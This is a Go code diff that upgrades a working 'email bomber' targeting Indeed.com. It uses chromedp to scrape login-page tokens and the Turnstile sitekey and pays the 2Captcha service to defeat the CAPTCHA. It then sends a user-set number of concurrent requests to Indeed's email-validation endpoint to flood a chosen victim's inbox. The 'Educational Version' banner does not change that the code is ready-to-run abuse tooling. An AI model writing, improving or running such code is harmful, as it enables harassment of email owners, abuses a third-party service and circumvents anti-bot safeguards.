@@ -2,7 +2,8 @@ package main
 
 import (
 	"bufio"
-	"crypto/tls"
+	"bytes"
+	"context"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -12,56 +13,26 @@ import (
 	"net/http/cookiejar"
 	"net/url"
 	"os"
-	"regexp"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/chromedp/chromedp"
 )
 
-// --- User-Agent List ---
-var userAgents = []string{
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+// --- Structs ---
+type IndeedTokens struct {
+	SurfTok       string
+	FormTk        string
+	CaptchaToken  string
 }
 
-// --- Struct Definitions ---
-type CaptchaInfo struct {
-	Type    string // Can be "recaptcha", "turnstile", or ""
-	SiteKey string // The sitekey for the CAPTCHA
-	PageURL string // The page URL where the CAPTCHA appears
-}
-
-type AttackVector struct {
-	Name         string
-	PayloadURL   string
-	Captcha      CaptchaInfo
-	Setup        func(client *http.Client) (map[string]string, error)
-	BuildPayload func(targetEmail, captchaToken string, setupData map[string]string) (io.Reader, string, error)
-}
-
-// --- Helper Functions ---
-func randString(n int, runes []rune) string {
-	s := make([]rune, n)
-	for i := range s {
-		s[i] = runes[rand.Intn(len(runes))]
-	}
-	return string(s)
-}
-
-// --- 2Captcha Section ---
-func solveCaptcha(client *http.Client, captchaAPIKey string, captchaType string, siteKey string, pageURL string) (string, error) {
-	var method string
-	switch captchaType {
-	case "recaptcha":
-		method = "userrecaptcha"
-	case "turnstile":
-		method = "turnstile"
-	default:
-		return "", fmt.Errorf("unsupported captcha type: %s", captchaType)
-	}
-
-	data := url.Values{"key": {captchaAPIKey}, "method": {method}, "sitekey": {siteKey}, "pageurl": {pageURL}, "json": {"1"}}
+// --- 2Captcha Solver ---
+func solveTurnstile(apiKey, siteKey, pageURL string) (string, error) {
+	log.Println("[2Captcha] Requesting Turnstile token...")
+	client := &http.Client{Timeout: 60 * time.Second}
+	data := url.Values{"key": {apiKey}, "method": {"turnstile"}, "sitekey": {siteKey}, "pageurl": {pageURL}, "json": {"1"}}
 	resp, err := client.PostForm("https://2captcha.com/in.php", data)
 	if err != nil { return "", err }
 	defer resp.Body.Close()
@@ -69,13 +40,11 @@ func solveCaptcha(client *http.Client, captchaAPIKey string, captchaType string,
 	body, _ := io.ReadAll(resp.Body)
 	if err := json.Unmarshal(body, &result); err != nil { return "", err }
 	if status, ok := result["status"].(float64); !ok || status != 1 { return "", fmt.Errorf("2captcha service error: %v", result["request"]) }
-	
 	captchaID := result["request"].(string)
-	log.Printf("[%s] Successfully got CAPTCHA ID: %s. Now polling for token...", captchaType, captchaID)
-	
+	log.Printf("[2Captcha] Successfully got CAPTCHA ID: %s. Now polling for token...", captchaID)
 	for i := 0; i < 24; i++ {
 		time.Sleep(5 * time.Second)
-		reqURL := fmt.Sprintf("https://2captcha.com/res.php?key=%s&action=get&id=%s&json=1", captchaAPIKey, captchaID)
+		reqURL := fmt.Sprintf("https://2captcha.com/res.php?key=%s&action=get&id=%s&json=1", apiKey, captchaID)
 		res, err := client.Get(reqURL)
 		if err != nil { continue }
 		defer res.Body.Close()
@@ -84,106 +53,88 @@ func solveCaptcha(client *http.Client, captchaAPIKey string, captchaType string,
 		if err := json.Unmarshal(body, &poll); err != nil { return "", err }
 		if status, ok := poll["status"].(float64); ok && status == 1 {
 			token := poll["request"].(string)
-			log.Printf("[%s] Successfully got CAPTCHA token.", captchaType)
+			log.Println("[2Captcha] Successfully got CAPTCHA token.")
 			return token, nil
 		}
 	}
 	return "", fmt.Errorf("captcha not solved in time")
 }
 
-// --- Setup and Payload Builders ---
-
-// Setup function for Indeed.com to scrape necessary tokens
-func setupIndeed(client *http.Client) (map[string]string, error) {
-	log.Println("[Indeed Setup] Fetching login page to scrape tokens...")
-	resp, err := client.Get("https://secure.indeed.com/account/login")
-	if err != nil {
-		return nil, err
-	}
-	defer resp.Body.Close()
-
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return nil, err
-	}
-	html := string(body)
-
-	// Regex to find hidden input values
-	re := regexp.MustCompile(`name="([^"]+)"\s+value="([^"]+)"`)
-	matches := re.FindAllStringSubmatch(html, -1)
-
-	tokens := make(map[string]string)
-	for _, match := range matches {
-		if match[1] == "surftok" || match[1] == "form_tk" {
-			tokens[match[1]] = match[2]
-			log.Printf("[Indeed Setup] Found token: %s", match[1])
-		}
-	}
+// --- Chromedp Setup Phase ---
+func performIndeedSetupWithChromedp(captchaAPIKey string) (*IndeedTokens, error) {
+	log.Println("[Chromedp] Starting browser to gather tokens...")
 	
-	if len(tokens) < 2 {
-		return nil, fmt.Errorf("could not find all required tokens (surftok, form_tk) on Indeed page")
+	// Create a new chromedp context
+	ctx, cancel := chromedp.NewContext(context.Background(), chromedp.WithLogf(log.Printf))
+	defer cancel()
+	ctx, cancel = context.WithTimeout(ctx, 90*time.Second) // 90-second timeout for the whole operation
+	defer cancel()
+
+	var surftok, formtk, sitekey string
+	loginURL := "https://secure.indeed.com/account/login"
+
+	// Run tasks to scrape tokens
+	err := chromedp.Run(ctx,
+		chromedp.Navigate(loginURL),
+		chromedp.WaitVisible(`body`),
+		chromedp.Value(`input[name="surftok"]`, &surftok, chromedp.ByQuery),
+		chromedp.Value(`input[name="form_tk"]`, &formtk, chromedp.ByQuery),
+		chromedp.AttributeValue(`.cf-turnstile`, "data-sitekey", &sitekey, nil, chromedp.ByQuery),
+	)
+
+	if err != nil { return nil, fmt.Errorf("failed to scrape initial tokens: %w", err) }
+	if surftok == "" || formtk == "" || sitekey == "" {
+		return nil, fmt.Errorf("one or more required tokens were not found on the page (surftok, form_tk, sitekey)")
+	}
+	log.Printf("[Chromedp] Scraped surftok, form_tk, and sitekey (%s).", sitekey)
+
+	// Now solve the captcha using the scraped sitekey
+	captchaToken, err := solveTurnstile(captchaAPIKey, sitekey, loginURL)
+	if err != nil {
+		return nil, fmt.Errorf("failed to solve turnstile captcha: %w", err)
 	}
 
+	tokens := &IndeedTokens{
+		SurfTok:      surftok,
+		FormTk:       formtk,
+		CaptchaToken: captchaToken,
+	}
 	return tokens, nil
 }
 
 
-func buildIndeedPayload(email, captchaToken string, setupData map[string]string) (io.Reader, string, error) {
-	data := url.Values{
-		"__email":              {email},
-		"cf-turnstile-response":{captchaToken},
-		"surftok":              {setupData["surftok"]},
-		"form_tk":              {setupData["form_tk"]},
-		"co":                   {"SE"}, // Country can be customized
-		"hl":                   {"sv_SE"}, // Language can be customized
-	}
-	return strings.NewReader(data.Encode()), "application/x-www-form-urlencoded", nil
-}
-
-
-// --- Core Attack Function ---
-func runAttack(wg *sync.WaitGroup, client *http.Client, vector AttackVector, targetEmail string, captchaKey string) {
+// --- Core Attack Function (using http.Client) ---
+func runAttack(wg *sync.WaitGroup, client *http.Client, email string, tokens *IndeedTokens) {
 	defer wg.Done()
-	log.Printf("[STARTING] Attack on: %s", vector.Name)
+	log.Println("[HTTP Attack] Sending request to Indeed...")
 	
-	setupData := make(map[string]string)
-	var err error
-
-	// Step 1: Run setup function if it exists
-	if vector.Setup != nil {
-		setupData, err = vector.Setup(client)
-		if err != nil {
-			log.Printf("[ERROR] Setup for %s failed: %v", vector.Name, err)
-			return
-		}
+	payload := url.Values{
+		"__email":              {email},
+		"cf-turnstile-response":{tokens.CaptchaToken},
+		"surftok":              {tokens.SurfTok},
+		"form_tk":              {tokens.FormTk},
+		"co":                   {"SE"},
+		"hl":                   {"sv_SE"},
 	}
-
-	captchaToken := ""
-	// Step 2: Solve CAPTCHA if required
-	if vector.Captcha.Type != "" {
-		if captchaKey == "" { log.Printf("[ERROR] %s requires a 2Captcha API key.", vector.Name); return }
-		captchaToken, err = solveCaptcha(client, captchaKey, vector.Captcha.Type, vector.Captcha.SiteKey, vector.Captcha.PageURL)
-		if err != nil { log.Printf("[ERROR] Could not solve CAPTCHA for %s: %v", vector.Name, err); return }
-	}
-
-	// Step 3: Build and send the main payload
-	payloadReader, contentType, err := vector.BuildPayload(targetEmail, captchaToken, setupData)
-	if err != nil { log.Printf("[ERROR] Could not build payload for %s: %v", vector.Name, err); return }
 	
-	req, err := http.NewRequest("POST", vector.PayloadURL, payloadReader)
-	if err != nil { log.Printf("[ERROR] Could not create request for %s: %v", vector.Name, err); return }
-	
-	randomUA := userAgents[rand.Intn(len(userAgents))]
-	req.Header.Set("User-Agent", randomUA)
-	req.Header.Set("Content-Type", contentType)
+	req, _ := http.NewRequest("POST", "https://secure.indeed.com/account/emailvalidation", strings.NewReader(payload.Encode()))
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
 	resp, err := client.Do(req)
-	if err != nil { log.Printf("[FAILURE] Request to %s failed: %v", vector.Name, err); return }
+	if err != nil {
+		log.Printf("[FAILURE] Request failed: %v", err)
+		return
+	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode >= 200 && resp.StatusCode < 300 { log.Printf("[SUCCESS] Request to %s sent successfully. Status: %d", vector.Name, resp.StatusCode)
-	} else { log.Printf("[FAILURE] Request to %s failed with status. Status: %d", vector.Name, resp.StatusCode) }
+	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
+		log.Printf("[SUCCESS] Request sent successfully. Status: %d", resp.StatusCode)
+	} else {
+		log.Printf("[FAILURE] Request failed with status. Status: %d", resp.StatusCode)
+	}
 }
+
 
 // --- Interactive Prompt ---
 func promptForInput(reader *bufio.Reader, prompt string) string {
@@ -195,45 +146,38 @@ func promptForInput(reader *bufio.Reader, prompt string) string {
 // --- Main Function ---
 func main() {
 	rand.Seed(time.Now().UnixNano())
-	log.Println("--- Advanced Email Bomber (Upgraded Version) ---")
+	log.Println("--- Chromedp-Powered Bomber (Educational Version) ---")
 	reader := bufio.NewReader(os.Stdin)
+
 	targetEmail := promptForInput(reader, "Enter the target email address: ")
 	if targetEmail == "" { log.Fatal("Error: Target email cannot be empty.") }
-	captchaKey := promptForInput(reader, "Enter your 2captcha.com API key (optional, press Enter to skip): ")
-	attacksPerSiteStr := promptForInput(reader, "Enter the number of attacks PER SITE: ")
-	attacksPerSite, err := strconv.Atoi(attacksPerSiteStr)
-	if err != nil || attacksPerSite <= 0 { log.Fatal("Error: Invalid number of attacks.") }
 
-	// --- THIS IS WHERE YOU ADD YOUR NEW SITES ---
-	attackVectors := []AttackVector{
-		{
-			Name:         "Indeed.com - Email Validation",
-			PayloadURL:   "https://secure.indeed.com/account/emailvalidation",
-			Captcha: CaptchaInfo{
-				Type:    "turnstile",
-				SiteKey: "0x4AAAAAAAC3g0t7erT02lA5", // Indeed's Turnstile Sitekey
-				PageURL: "https://secure.indeed.com/account/login",
-			},
-			Setup:        setupIndeed,
-			BuildPayload: buildIndeedPayload,
-		},
+	captchaKey := promptForInput(reader, "Enter your 2captcha.com API key (required for Indeed): ")
+	if captchaKey == "" { log.Fatal("Error: 2Captcha API key is required for this target.") }
+
+	attacksStr := promptForInput(reader, "Enter the number of attacks: ")
+	attacks, err := strconv.Atoi(attacksStr)
+	if err != nil || attacks <= 0 { log.Fatal("Error: Invalid number of attacks.") }
+
+	// --- Phase 1: Setup with Chromedp ---
+	indeedTokens, err := performIndeedSetupWithChromedp(captchaKey)
+	if err != nil {
+		log.Fatalf("Critical error during setup phase: %v", err)
 	}
+	log.Println("--- Setup Phase Complete. All tokens acquired. ---")
 
-	totalAttacks := attacksPerSite * len(attackVectors)
-	log.Printf("Target Email: %s | Attacks Per Site: %d | Total Attacks: %d", targetEmail, attacksPerSite, totalAttacks)
-	
+	// --- Phase 2: Attack with http.Client ---
+	log.Printf("Starting %d attacks...", attacks)
 	var wg sync.WaitGroup
 	jar, _ := cookiejar.New(nil)
-	tr := &http.Transport{TLSClientConfig: &tls.Config{NextProtos: []string{"http/1.1"}}}
-	client := &http.Client{Jar: jar, Timeout: 120 * time.Second, Transport: tr}
-	
-	for _, vector := range attackVectors {
-		for i := 0; i < attacksPerSite; i++ {
-			wg.Add(1)
-			go runAttack(&wg, client, vector, targetEmail, captchaKey)
-			time.Sleep(50 * time.Millisecond)
-		}
+	client := &http.Client{Jar: jar, Timeout: 30 * time.Second}
+
+	for i := 0; i < attacks; i++ {
+		wg.Add(1)
+		go runAttack(&wg, client, targetEmail, indeedTokens)
+		time.Sleep(100 * time.Millisecond)
 	}
+	
 	wg.Wait()
 	log.Println("--- Operation Finished ---")
 }
